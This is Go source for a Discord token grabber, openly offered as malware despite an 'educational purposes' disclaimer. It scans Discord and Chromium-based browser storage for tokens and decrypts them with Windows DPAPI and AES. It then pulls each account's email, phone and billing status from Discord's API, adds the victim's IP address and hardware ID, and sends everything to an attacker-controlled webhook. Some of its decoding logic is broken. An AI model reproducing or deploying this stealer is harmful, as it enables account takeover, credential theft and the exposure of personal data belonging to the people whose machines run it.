package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"encoding/base64"
	"encoding/json"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"time"
	"unsafe"

	"github.com/joho/godotenv"
	"golang.org/x/sys/windows"
)

var (
	advapi32DLL = windows.NewLazySystemDLL("advapi32.dll")
	// Load the CryptUnprotectData function from the advapi32 DLL.
	cryptUnprotectDataProc = advapi32DLL.NewProc("CryptUnprotectData")
)

type Path struct {
	name string
	path string
}

type Paths struct {
	paths []Path
}

type LocalState struct {
	os_crypt struct {
		encrypted_key string
	}
}

func (p *Paths) Add(name, path string) {
	p.paths = append(p.paths, Path{name, path})
}

func (p *Paths) Get_Specific(name string) string {
	for _, path := range p.paths {
		if path.name == name {
			return path.path
		}
	}
	return ""
}

var Roaming = os.Getenv("APPDATA")
var Local = os.Getenv("LOCALAPPDATA")

var Paths_Seriously = Paths{}

func initialize_struct() {
	Paths_Seriously.Add("Discord", Roaming+"\\Discord")
	Paths_Seriously.Add("Discord Canary", Roaming+"\\discordcanary")
	Paths_Seriously.Add("Discord PTB", Roaming+"\\discordptb")
	Paths_Seriously.Add("Lightcord", Roaming+"\\Lightcord")
	Paths_Seriously.Add("Opera", Roaming+"\\Opera Software\\Opera Stable")
	Paths_Seriously.Add("Opera GX", Roaming+"\\Opera Software\\Opera GX Stable")
	Paths_Seriously.Add("Amigo", Roaming+"\\Amigo\\User Data\\Default")
	Paths_Seriously.Add("Torch", Roaming+"\\Torch\\User Data\\Default")
	Paths_Seriously.Add("Kometa", Roaming+"\\Kometa\\User Data\\Default")
	Paths_Seriously.Add("Orbitum", Roaming+"\\Orbitum\\User Data\\Default")
	Paths_Seriously.Add("CentBrowser", Roaming+"\\CentBrowser\\User Data\\Default")
	Paths_Seriously.Add("7Star", Roaming+"\\7Star\\7Star\\User Data\\Default")
	Paths_Seriously.Add("Sputnik", Roaming+"\\Sputnik\\Sputnik\\User Data\\Default")
	Paths_Seriously.Add("Vivaldi", Roaming+"\\Vivaldi\\User Data\\Default")
	Paths_Seriously.Add("Chrome SxS", Local+"\\Google\\Chrome SxS\\User Data\\Default")
	Paths_Seriously.Add("Chrome", Local+"\\Google\\Chrome\\User Data\\Default")
	Paths_Seriously.Add("Epic Privacy Browser", Local+"\\Epic Privacy Browser\\User Data\\Default")
	Paths_Seriously.Add("Microsoft Edge", Local+"\\Microsoft\\Edge\\User Data\\Default")
	Paths_Seriously.Add("Yandex", Local+"\\Yandex\\YandexBrowser\\User Data\\Default")
	Paths_Seriously.Add("Brave", Local+"\\BraveSoftware\\Brave-Browser\\User Data\\Default")
	Paths_Seriously.Add("Uran", Local+"\\uCozMedia\\Uran\\User Data\\Default")
	Paths_Seriously.Add("Iridium", Local+"\\Iridium\\User Data\\Default")
}

// CryptUnprotectData is a wrapper for the CryptUnprotectData function from the Windows API.
// It decrypts encrypted data using the specified key and optional entropy.
func CryptUnprotectData(encryptedData, key, entropy []byte) ([]byte, error) {
	// Set up the DataBlob structures for the input and output data.
	var inputDataBlob, outputDataBlob windows.DataBlob
	inputDataBlob.Size = uint32(len(encryptedData))
	inputDataBlob.Data = &encryptedData[0]
	outputDataBlob.Size = 0
	outputDataBlob.Data = nil

	// Set up the DataBlob structure for the key data.
	var keyDataBlob windows.DataBlob
	keyDataBlob.Size = uint32(len(key))
	keyDataBlob.Data = &key[0]

	// Set up the DataBlob structure for the entropy data, if provided.
	var entropyDataBlob *windows.DataBlob
	if entropy != nil {
		entropyDataBlob = &windows.DataBlob{Size: uint32(len(entropy)), Data: &entropy[0]}
	}

	// Call the CryptUnprotectData function.
	result, _, err := cryptUnprotectDataProc.Call(
		uintptr(unsafe.Pointer(&inputDataBlob)),
		uintptr(0),
		uintptr(unsafe.Pointer(entropyDataBlob)),
		uintptr(0),
		uintptr(0),
		0,
		uintptr(unsafe.Pointer(&outputDataBlob)))
	if result == 0 {
		return nil, err
	}

	// Extract the decrypted data from the output DataBlob.
	decryptedData := make([]byte, outputDataBlob.Size)
	copy(decryptedData, (*[1 << 30]byte)(unsafe.Pointer(outputDataBlob.Data))[:outputDataBlob.Size])
	return decryptedData, nil
}

// Decrypt decrypts the given encrypted buffer using the specified master key.
func Decrypt(buff, masterKey []byte) (string, error) {
	// Decrypt the master key using the CryptUnprotectData function.
	key, err := CryptUnprotectData(masterKey, nil, nil)
	if err != nil {
		return "", err
	}

	// Create a new AES cipher using the decrypted key and IV.
	cipher, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	// Decrypt the rest of the buffer using the cipher.
	decrypted := make([]byte, len(buff[16:]))
	cipher.Decrypt(decrypted, buff[16:])

	// Trim the last 16 bytes of the decrypted data (the GCM tag).
	decrypted = decrypted[:len(decrypted)-16]

	// Convert the decrypted data to a string.
	decryptedString, err := string(decrypted), nil
	if err != nil {
		return "", err
	}

	return decryptedString, nil
}

func Get_IP() (string, error) {
	// Get the IP address of the current host by send request to api.ipify.org
	res, err := http.Get("https://api.ipify.org")
	if err != nil {
		panic(res)
	}
	defer res.Body.Close()
	body, err := ioutil.ReadAll(res.Body)
	return string(body), err
}

func Get_Hardware_ID() string {
	// Get the hardware ID of the current host by send request to api.ipify.org
	command := "wmic csproduct get uuid"
	res, err := exec.Command("cmd", "/C", command).Output()
	if err != nil {
		panic(err)
	}
	return string(res)
}

func Get_Token() []string {
	tokens := make([]string, 0)
	checks := make([]string, 0)
	for i, platform := range Paths_Seriously.paths {
		println("Checking for " + platform.name + "...")
		// Get the path of the current platform
		s := Paths_Seriously.paths[i]

		// Check if the path exists
		_, err := os.Stat(s.path)
		if err != nil {
			println("Path not found!")
			continue
		}
		println("Path found!")

		// now try to open it
		file, err := os.Open(s.path + "\\Local State")
		if err != nil {
			println("Local State not found!")
			continue
		}
		println("Local State found!")
		defer file.Close()
		thingy := LocalState{}
		json.NewDecoder(file).Decode(&thingy)
		println("Decoded Local State!")
		encrypted_key := thingy.os_crypt.encrypted_key

		// now try to loop all through local storage
		file, err = os.Open(s.path + "\\Local Storage\\leveldb")
		if err != nil {
			println("Local Storage not found!")
			continue
		}
		println("Local Storage found!")
		defer file.Close()
		files, err := file.Readdir(-1)
		if err != nil {
			println("Local Storage files were not found!")
			continue
		}
		println("Local Storage files found!")
		for _, f := range files {
			println("Checking file " + f.Name() + "...")
			file_local_storage, err := os.Open(s.path + "\\Local Storage\\leveldb\\" + f.Name())
			if err != nil {
				println("File not found!")
				continue
			}
			println("File found!")
			defer file_local_storage.Close()
			regex := regexp.MustCompile(`dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*`)
			println("Regex created!")
			scanner := bufio.NewScanner(file_local_storage)
			var lines []string
			for scanner.Scan() {
				lines = append(lines, scanner.Text())
			}
			for _, line := range lines {
				{
					line = strings.TrimSpace(line)
					if regex.MatchString(line) {
						println("Found token!")
						tokens = append(tokens, line)
					}
				}
			}
		}
		for i := range tokens {
			println("Decrypting token " + tokens[i] + "...")
			// clean
			tokens[i] = strings.Replace(tokens[i], "\\", "", -1)
			//now its time to decode
			j := strings.Split(tokens[i], ":")
			k, err := base64.StdEncoding.DecodeString(j[1])
			if err != nil {
				continue
			}
			n, err := base64.StdEncoding.DecodeString(encrypted_key)
			if err != nil {
				continue
			}
			decoded, err := Decrypt(k, n)
			if err != nil {
				continue
			}
			checks = append(checks, decoded)
		}
	}
	return checks
}

type Datastruct struct {
	user_name   string
	user_id     string
	email       string
	phone       string
	mfa_enabled bool
	has_nitro   bool
	nitro_data  struct {
		current_period_start string
		current_period_end   string
	}
	days_left int
}

type Final_ struct {
	user_name   string
	user_id     string
	email       string
	phone       string
	mfa_enabled bool
	has_nitro   bool
	nitro_data  struct {
		current_period_start time.Time
		current_period_end   time.Time
	}
	days_left int
}

func Get_Information(token string) Final_ {
	url := "https://discord.com/api/v6/users/@me"
	nitro_url := "https://discord.com/api/v6/users/@me/billing/subscriptions"
	client := &http.Client{}
	req, err := http.NewRequest("GET", url, nil)
	req.Header.Add("Authorization", token)
	req.Header.Add("Content-Type", "application/json")
	client.Do(req)
	if err != nil {
		panic(err)
	}
	res, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer res.Body.Close()
	var response_body Datastruct
	json.NewDecoder(res.Body).Decode(&response_body)
	req, err = http.NewRequest("GET", nitro_url, nil)
	req.Header.Add("Authorization", token)
	req.Header.Add("Content-Type", "application/json")
	client.Do(req)
	if err != nil {
		panic(err)
	}
	res, err = client.Do(req)
	if err != nil {
		panic(err)
	}
	defer res.Body.Close()
	response_body.has_nitro = false
	resq, err := ioutil.ReadAll(res.Body)
	j := string(resq)
	if err != nil {
		panic(err)
	}
	j = strings.TrimSpace(j)
	if len(j) > 2 {
		response_body.has_nitro = false
	} else {
		response_body.has_nitro = true
		json.NewDecoder(res.Body).Decode(&response_body.nitro_data)
	}
	var start time.Time
	var end time.Time
	if response_body.has_nitro {
		// required to convert date in format of RFC3339 to time.Time
		end, err = time.Parse(time.RFC3339, response_body.nitro_data.current_period_end)
		if err != nil {
			panic(err)
		}
		start, err = time.Parse(time.RFC3339, response_body.nitro_data.current_period_start)
		if err != nil {
			panic(err)
		}

	} else {
		start = time.Now()
		end = time.Now()
		// can't really make it null so i just set it to now
		// might subtract those time and check if its 0
	}
	n := Final_{
		user_name:   response_body.user_name,
		user_id:     response_body.user_id,
		email:       response_body.email,
		phone:       response_body.phone,
		mfa_enabled: response_body.mfa_enabled,
		has_nitro:   response_body.has_nitro,
		nitro_data: struct {
			current_period_start time.Time
			current_period_end   time.Time
		}{
			current_period_start: start,
			current_period_end:   end,
		},
		days_left: int(end.Sub(start).Hours() / 24),
	}

	return n
}

type Payload struct {
	content  string
	username string
}

func Send_Webhook(url string, data Payload) {
	client := &http.Client{}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		panic(err)
	}
	req.Header.Add("Content-Type", "application/json")
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
	d, err := json.Marshal(data)
	if err != nil {
		panic(err)
	}
	req.Body = ioutil.NopCloser(bytes.NewReader(d))
	res, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer res.Body.Close()

}

func main() {
	println("Started")
	initialize_struct()
	println("Initialized struct")
	// check if its windows
	if runtime.GOOS != "windows" {
		panic("This program only works on windows")
	}
	println("Verified its windows")
	// go:embed .env
	err := godotenv.Load(".env")
	if err != nil {
		panic(err)
	}
	println("Loaded .env")
	webhook_url := os.Getenv("WEBHOOK_URL")
	// check if webhook url is empty
	if webhook_url == "" {
		panic("WEBHOOK_URL is not set")
	}
	checks := Get_Token()
	println("Got tokens")
	print(checks)
	for i := range checks {
		response := Get_Information(checks[i])
		println("Got information for " + response.user_name)
		ip, err := Get_IP()
		println("Got IP")
		if err != nil {
			panic(err)
		}
		hardware_id := Get_Hardware_ID()
		println("Got hardware id")
		embed_string := `
		**User Name:** ` + response.user_name + `
		**User ID:** ` + response.user_id + `
		**Email:** ` + response.email + `
		**Phone:** ` + response.phone + `
		**MFA Enabled:** ` + strconv.FormatBool(response.mfa_enabled) + `
		**Has Nitro:** ` + strconv.FormatBool(response.has_nitro) + `
		**Nitro Start:** ` + response.nitro_data.current_period_start.Format("2006-01-02 15:04:05") + `
		**Nitro End:** ` + response.nitro_data.current_period_end.Format("2006-01-02 15:04:05") + `
		**Days Left:** ` + strconv.Itoa(response.days_left) + `
		**IP:** ` + ip + `
		**Hardware ID:** ` + hardware_id + `
		**Token:** ` + checks[i] + `
		Made by: timelessnesses and uh don't use this for bad things
		`
		println(embed_string)
		payload := Payload{
			content:  embed_string,
			username: "a very cool discord token grabber for educational purposes and totally not for doing bad things and don't blame timelessnesses for this",
		}
		Send_Webhook(webhook_url, payload)
		println("sent!")
	}
}
